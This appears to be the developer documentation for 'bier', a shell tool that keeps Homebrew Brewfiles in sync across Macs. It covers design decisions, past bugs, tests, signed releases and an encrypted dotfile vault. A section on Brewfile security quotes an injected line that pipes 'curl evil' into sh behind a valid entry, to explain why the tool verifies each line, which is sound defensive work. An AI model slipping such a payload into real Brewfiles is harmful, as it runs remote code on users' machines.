# Development

How `bier` is built, which decisions were made and why, and how to work
on it without reintroducing old mistakes.

For using it, see [README.md](README.md) and [GUIDE.md](GUIDE.md).

## Layout

    bin/bier             the program, a single shell script
    app/                 BierMenu, the menu bar app in Swift
    test/                test suite with a Homebrew stand-in
    install.sh           setup on one Mac
    .githooks/pre-push   keeps a red state off the server
    .gitattributes       the merge=union rule for the data repository

The inventory deliberately does **not** live here but in a private
repository belonging to the user. It reveals which software runs on their
machines, and whoever clones this repository has no write access here
anyway. Both paths are recorded as `root` and `data` in
`~/.config/bier/config`; `install.sh` writes them.

Every git command that `bier` issues on its own goes to `data`. Only
`bier upgrade` also touches `root`, to fetch and build a newer version of
the program. That split is why the two are separate commands: `sync` is
about the Macs, `upgrade` about the program.

There is no fallback from `data` to `root`. A fresh clone would otherwise
write its inventory into the public repository — precisely what is to be
prevented. If `data` is missing, `need_repo` aborts with instructions.

## Design decisions

Each one has a history. Anyone wanting to overturn one should know why it
is there.

**No stored diffs.** The difference between two devices is recomputed on
every invocation, never stored. The Brewfile format has no "minus": a
stored diff would no longer be installable, and it would silently change
meaning as soon as `main` grows.

**A delta can only add, never subtract.** Anything a device must
explicitly not run cannot live in `main`. The alternative — an exclusion
list per device — brings a second mechanism with special cases of its
own. `bier take --from-main` solves the same case with what is already
there.

**`bier dump` removes nothing.** Something recorded but not installed
stays. Otherwise you would lose whatever `bier take` has just picked. An
entry really goes away only through `uninstall`, `prune` or a move into
`main`.

**`bier dump` does not adopt what was removed elsewhere.** Otherwise a
dump on the second Mac cements the removal as a device-specific
installation and it is lost. `--adopt` takes it in deliberately.

**The menu bar shows nothing about other devices** — neither a list nor a
count. It says nothing about whether there is anything to do on *this*
Mac, and it does not scale beyond two or three devices. That is what
`bier list` is for.

**`bier sync` asks nothing** and resolves conflicts itself. Nobody
should have to know git commands to keep their Macs in step.

**Only `Brewfiles/` gets committed.** A `git add -A` once hid a source
change under an inventory message.

## Careful with `bier main`

`bier main` rewrites the shared inventory from the Mac it runs on.
Anything that is in there but not installed here drops out for good —
even if another device still has it. The command shows that before
asking:

    Will drop out of main for good, because it is not installed
    on mini — even if another device still has it:
      - cask "font-meslo-lg-nerd-font"

    To keep it, hand it to a device first:
      bier take --from-main

That is why it is a command for the beginning of a setup, not an everyday
tool.

## Traps that have already sprung

All of them are covered by tests — reintroduce one and you get caught.

- A `trap … RETURN` per function stays armed and fires again when the
  **calling** function returns. The local variable is gone by then and
  `set -u` aborts. Hence one temp directory for the whole run, created at
  startup.
- `entries` without `|| true` returns exit 1 for a file without entries
  and, with `pipefail`, drags every assignment down with it. `bier` dies
  without a word.
- `kind_of` has to look for exact matches in the Brewfiles **first**,
  then ask Homebrew, and check **taps last**: a short name can match a
  tap *and* a cask inside it.
- `was_tracked` may report "removed elsewhere" only when the entry is on
  **no** list any more. Otherwise a package picked up from the other Mac
  counts as a removal.
- Slow output into a pipe (`bier list | head`) produces a broken pipe.
  That is why the overview is collected and printed in one go.
- `prune` has to remove taps **last**: `brew untap` refuses while a cask
  from the tap is still installed.
- After stopping the app, `install.sh` must not guess a second but has to
  wait — otherwise `open` finds the old instance alive and merely
  activates it, and the old code keeps running.
- `bier upgrade` overwrites the running script with the pull, and bash
  reads it in chunks. So `upgrade` hands over to a new process **before**
  the pull, one whose commands live in memory.
- During the split into two repositories `cmd_push` vanished along with
  the function next to it, while its line in the dispatch table stayed.
  No test noticed, because only the read-only commands were exercised.

## Tests

    test/run              every case
    test/run take         only cases whose name contains "take"
    test/run -v           show the output of each case

Every case gets a world of its own: two git servers (one for the code,
one for the data), two simulated Macs with a working copy of each, and a
**Homebrew stand-in**. It reads a Mac's "system state" from a file and
maps onto it everything `bier` asks of `brew`.

That makes the tests fast (a good ten seconds for all of them),
deterministic, and able to stage states that would be tedious or
destructive on a real Mac — uninstalling a package, for instance.

The stand-in also plays along with quirks that `bier` has tripped over:
`brew untap` refuses while a cask from the tap is installed, and
`brew list --cask` names casks by their short name although the Brewfile
writes them fully qualified.

### Adding a case

`test/cases/NNN-name.sh`, the second line is the title. Inside it,
`system`, `seed_file`, `bier` and the assertions from
`test/lib/harness.sh` are available:

    system mini <<'EOF'
    brew "wget"
    EOF

    bier mini dump
    assert_file_has "$(bf mini mini)" 'brew "wget"'

Rules born of damage:

- `bier` deliberately does **not** run in a subshell — its output ends up
  in `$OUT`. With `out=$(bier …)` failure marks would be lost and the
  case would pass green.
- Answers to prompts come from `answer y`.
- Every output is checked automatically for the shell complaining
  (`unbound variable`, `command not found`, …). An error that `bier`
  reports but exits 0 on would otherwise be invisible.
- **Fixtures have to reproduce the shape of the real bug.** A shortened
  tap name did not reproduce the ambiguity, and the test passed green.

The suite was verified by reintroducing every known regression. Anyone
changing it should repeat that.

### Before pushing

`.githooks/pre-push` requires green tests before code reaches the server
— the other Mac picks that state up on its next `bier upgrade` and builds
it. If a case is red, the push is aborted.

    pre-push: code changed, running tests …
    pre-push: 17 cases, all passed.

`install.sh` installs the hook (`core.hooksPath`). Bypass in an
emergency: `git push --no-verify`.

## Version

    bier version

    bier 0.11.0
      Commit  a1333cd of 2026-09-20
      Code    /Users/yourname/bierfile
      Data    /Users/yourname/bierdata
      Device  mini
      App     0.11.0 (/Applications/BierMenu.app)

`BIER_VERSION` appears in exactly one place, in `bin/bier`.
`app/build.sh` reads it from there into the app bundle, `bier state`
reports it. That is how BierMenu notices that it is older than the script
and offers an upgrade in the menu. **Bump it on behavioural changes** — an
old app quietly running on after an install has happened before.

## Releases

A release is a tag, and the tag is what `bier upgrade` follows:

```sh
git tag -a v0.13.0 -m "what changed"
git push origin v0.13.0
gh release create v0.13.0 --notes "what changed"    # optional
```

The tag has to match `BIER_VERSION`, because that is the number the
installed copy compares itself against. GitHub builds the download for
every tag on its own — `archive/refs/tags/v0.13.0.tar.gz` exists without
anyone uploading anything. `gh release create` only adds the release page
with the notes on it.

`check_code` fetches the tags, takes the highest one (`--sort=-v:refname`)
and holds it against `BIER_VERSION`. The comparison runs through
`sort -V`, because a string comparison would call 0.9.1 newer than
0.13.0. If the release is higher, `bier upgrade` checks that tag out
detached — it lands on the release, not on whatever the branch has
drifted to since.

**A server without tags keeps working as before**: `check_code` then
falls back to comparing the branch with its counterpart. That is how the
private server is used during development, where every push is meant to
arrive right away, without cutting a release for it.

`bier state --fetch` fetches the tags as well and prints `NEWCODE <version>`
when one is waiting. BierMenu shows it and offers the upgrade — otherwise
nobody would ever learn that a release is out.

## A Brewfile is Ruby

`brew bundle` does not read a Brewfile, it **evaluates** it. A line that
is not an entry is a program, and it runs on the Mac that installs.

The trap is that `entries` reads only the front of a line:

```
in the file:   brew "wget"; system("curl evil | sh")
bier shows:    brew "wget"
brew runs:     both
```

So the payload rode along behind a valid entry, invisible to `bier
list`, `status`, `diff` and `state`, and `Brewfiles/main` is never
rewritten by everyday commands — `dump` only reads it. It would have sat
there indefinitely and reached every device, and `merge=union` would
have carried it through any conflict.

`verify_brewfile` therefore checks the **whole** line against the
grammar of an entry and refuses the file otherwise. `bier install` and
`bier take` verify before handing anything to `brew`; `bier status`
warns without being asked. Options are allowed by name —
`postinstall` is not among them, because its value is a shell command.

The check refuses rather than filters. Silently dropping the line would
hide exactly the attack it is meant to catch.

## Who gets to run code on your Mac

`bier upgrade` checks a tag out and runs `install.sh` straight
afterwards. Whoever can push a tag to the code remote therefore runs
code on every installation that upgrades. Nothing is verified and
nothing is sandboxed in between. That is the trust boundary, and it is
worth stating rather than papering over.

The repository is writable by its owner. Anything from anyone else
arrives as a pull request and is read before it is merged.

`bier trust` narrows that, for whoever wants it:

```sh
bier trust https://example.org/bier/allowed_signers
```

bier fetches the file once, prints the fingerprints, and remembers it in
`~/.config/bier/`. From then on `bier upgrade` installs a release only
when it is signed with a key from that file, and refuses one signed by
somebody else — or by nobody.

The point is **where the key comes from**. It is published on a host
that is not the one serving the code, so taking over the repository does
not hand anyone the key, and it would have had to happen before the key
was ever fetched. Fetching alone proves nothing: compare the fingerprint
against one you were given some other way.

Nothing is remembered by default, and then nothing is checked. An
earlier attempt got this wrong and refused to upgrade whenever a key was
missing, which strands every clone that never asked for any of this.

Releasing then needs the key in the agent and git told to use it:

```sh
ssh-add ~/.ssh/bier_signing
git -c gpg.format=ssh -c user.signingkey=~/.ssh/bier_signing.pub \
    tag -s v0.16.0 -m "…"
```

`v0.14.0` carries a GPG signature from a first attempt. Nothing reads
it.

## The vault

Three decisions hold it up. Each of them was measured, and each would
look like an arbitrary complication to whoever tries to simplify it.

**The Brewfiles stay readable.** Encrypting them was tried. A union
merge then glues two ciphertexts together, git reports `Auto-merging`
and exits 0, and the file is ruined without a word. And `was_tracked`
searches the history with `git log -S`, which reads the stored blob --
with ciphertext it finds nothing, and "removed elsewhere" stops working.
A transparent clean/smudge filter does not help: git works on what is
stored, not on what the working tree shows.

**The plain files live outside every repository**, in
`~/.bierfilevault`. A `.gitignore` is a rule somebody can get wrong; a
different directory is a fact. Only `Safe/` in the data repository
travels.

**Symmetric, with one passphrase, not a key per Mac.** Public keys would
mean an existing Mac has to re-encrypt for a new one before it can read
anything -- you cannot encrypt to a key you do not have yet. Symmetric
removes that: a new Mac needs the passphrase and nothing else. The price
is one shared secret, and losing a Mac means changing it everywhere.
`age` was the obvious candidate and does not fit: its passphrase mode is
interactive by design and cannot be scripted. gpg in `--batch` mode
with `--passphrase-fd` can, and gnupg is already there.

The passphrase lives in that Mac's own keychain -- a working copy, not a
place to keep it. `security` cannot create iCloud-synchronised items, so
syncing it would need a signed Swift helper, and BierMenu is signed ad
hoc.

**At the destination there is a symlink.** Copying would mean inventing
a semantic bier does not otherwise have for files: does editing
`~/.zshrc` get picked up, or overwritten? With one file the question
does not arise. Five tools were checked for whether writing through a
link keeps it -- vim, `>>`, `sed -i`, python, `cp` -- and all five do.
chezmoi copies because templates have to be rendered first, and we have
no templates.

**A scope is a directory**, `@laptops/dot_zshrc`, so the path says who a
file is for and there is no second list to keep in step. A device name
is a group of one. `.groups` is decrypted before anything else, because
everything after it asks whether it belongs here and `find` gives no
order worth relying on. `vault_seal` never deletes: a Mac legitimately
does not hold the other groups' files.

**Uninstalling puts the real files back first.** Every link points into
the vault, so tidying up without that step leaves a home full of dead
links and no `.zshrc` -- a data loss with advance notice.

`Safe/README-recovery.txt` is unencrypted and says how to get everything
back with `gpg` alone. The passphrase is the one thing nothing can
recover, and `bier vault --init` says so before it takes one.

## Looking at the icon

`app/preview-icon.swift` writes both resting states, six frames of the
animation, a strip with all of them side by side, and `pixel.png`:

```sh
swiftc -o /tmp/preview app/Glass.swift app/preview-icon.swift -framework AppKit
/tmp/preview /tmp/glass
open /tmp/glass/pixel.png
```

`pixel.png` shows the states at true menu bar size (30×34 pixels), scaled
up without smoothing. That is the view an icon has to be designed
against — rendered large, every draft looks good.
